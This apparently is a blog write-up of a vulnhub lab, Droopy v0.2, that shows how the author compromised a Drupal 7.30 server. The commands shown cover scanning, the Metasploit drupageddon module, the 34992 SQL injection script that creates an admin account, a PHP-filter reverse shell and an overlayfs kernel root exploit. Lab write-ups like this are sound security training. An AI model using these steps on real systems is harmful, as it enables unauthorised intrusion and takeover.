@@ -1,0 +1,142 @@
+---
+layout: post
+title: "Droopy:V0.2"
+date: 2016-08-01 10:57:14 -0500
+comments: true
+categories: [vulhub, drupal]
+---
+
+###Tools:
+
+* netdiscover
+* Nmap
+* Wfuzz
+* Nikto
+* Metasploit 
+* droopescan
+
+
+###Vulnerabilities:
+* [Drupal HTTP Parameter Key/Value SQL Injection](https://www.exploit-db.com/exploits/34992/)
+* [Linux Kernel 3.13.0 < 3.19 'overlayfs' Local Root Shell](https://www.exploit-db.com/exploits/37292/)
+
+<!--more-->
+Use netdiscover to detect target IP address
+
+`netdiscover -i eth0 -r 192.168.41.0/24`
+{% img  /images/blog/vulhub/drooy2/Selection_001.png   [title manually exploit [alt text]] %}
+
+192.168.41.155 is the target.
+
+Then run nmap to detect opening ports and running services on the target machine.
+
+`nmap -sV -v -O -A -T5 192.168.41.155 -p-`
+
+{% img  /images/blog/vulhub/drooy2/Selection_002.png   [title manually exploit [alt text]] %}
+
+Only port 80 is opening.
+
+use nikto to scan
+
+`nikto -h 192.168.41.155`	
+
+{% img  /images/blog/vulhub/drooy2/Selection_003.png   [title manually exploit [alt text]] %}
+
+No useful info come out.
+
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.155/FUZZ 2>/dev/null
+```
+
+
+{% img  /images/blog/vulhub/drooy2/Selection_004.png   [title manually exploit [alt text]] %}
+
+still same thing.
+
+check the http://192.168.41.155
+
+{% img  /images/blog/vulhub/drooy2/Selection_005.png   [title manually exploit [alt text]] %}
+
+Find the target use `Drupal`
+
+### Use Metasploit
+
+in msfconsole, search drupal, find an interesting exploit `exploit/multi/http/drupal_drupageddon`
+
+
+```
+msf > use exploit/multi/http/drupal_drupageddon
+msf exploit(drupal_drupageddon) > set rhost 192.168.41.155
+msf exploit(drupal_drupageddon) > exploit 
+
+```
+{% img  /images/blog/vulhub/drooy2/Selection_006.png   [title manually exploit [alt text]] %}
+
+get meterpreter, do command `shell` to get shell.
+
+use `python -c 'import pty; pty.spawn("/bin/bash")'` get bash
+
+user is www-data, next try to get root
+
+`uname -a`
+
+`Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux`
+
+the kernel is 3.1.30
+
+`searchsploit 3.1.30`
+
+{% img  /images/blog/vulhub/drooy2/Selection_007.png   [title manually exploit [alt text]] %}
+
+upload the exploit, compile and run it, get the root:
+
+{% img  /images/blog/vulhub/drooy2/Selection_008.png   [title manually exploit [alt text]] %}
+
+
+### Another way
+
+use droopescan to scan
+
+`droopescan scan drupal -u http://192.168.41.155/ -t 8`
+
+{% img  /images/blog/vulhub/drooy2/Selection_009.png   [title manually exploit [alt text]] %}
+
+now I know the version is 7.30
+
+`searchsploit drupal`
+
+find the 34992.txt exploit works.
+
+{% img  /images/blog/vulhub/drooy2/Selection_010.png   [title manually exploit [alt text]] %}
+
+`./34992.py -t http://192.168.41.155 -u test -p test`
+
+{% img  /images/blog/vulhub/drooy2/Selection_011.png   [title manually exploit [alt text]] %}
+
+
+this exploit creates an admin account test/test, then in `Modules`, make sure the `PHP filter` is selected.
+
+{% img  /images/blog/vulhub/drooy2/Selection_012.png   [title manually exploit [alt text]] %}
+
+Also in `People` -> `Permissions`, check `Use the PHP code text format`
+
+{% img  /images/blog/vulhub/drooy2/Selection_013.png   [title manually exploit [alt text]] %}
+
+
+In  `configuration` -> `Content authoring` -> `Text formats`,  need to check administrator box.
+
+
+{% img  /images/blog/vulhub/drooy2/Selection_014.png   [title manually exploit [alt text]] %}
+
+Then create a new content (copy and paste reverse shell php code) and use PhP Code in the format, save it, then netcat will get the shell.
+
+{% img  /images/blog/vulhub/drooy2/Selection_015.png   [title manually exploit [alt text]] %}
+
+
+Then use same method in the first part of this post to get the root.
+
+DONE
+
+
+
+
